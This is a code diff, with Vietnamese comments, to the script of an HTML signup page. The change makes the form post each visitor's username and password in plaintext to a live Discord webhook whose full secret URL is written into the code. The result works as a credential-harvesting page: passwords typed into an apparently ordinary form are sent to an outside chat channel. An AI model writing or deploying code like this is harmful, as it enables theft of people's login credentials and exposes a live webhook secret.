@@ -35,13 +35,18 @@
                 password: formData.get('password')
             };
 
-            // Gửi dữ liệu đến endpoint bên ngoài
-            fetch('https://example.com/your-webhook-endpoint', { // Thay thế URL bằng endpoint thực tế
+            // Tạo nội dung tin nhắn cho Discord webhook
+            const messageContent = `**New Signup**\nUsername: ${data.username}\nPassword: ${data.password}`;
+
+            // Gửi dữ liệu đến Discord webhook
+            fetch('https://discord.com/api/webhooks/1284222224173240352/2UsRx6JTP2vbDpCCQDSvfw5bJv2Y7sBq60lKuj2ESTyJl-Rq1rxUqwf-SkN6TRi_ix5R', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify(data)
+                body: JSON.stringify({
+                    content: messageContent
+                })
             }).then(response => {
                 if (response.ok) {
                     alert('Form submitted successfully!');
@@ -49,4 +54,10 @@
                     alert('Error submitting form.');
                 }
             }).catch(error => {
-                console.error('E
+                console.error('Error:', error);
+                alert('Error submitting form.');
+            });
+        });
+    </script>
+</body>
+</html>
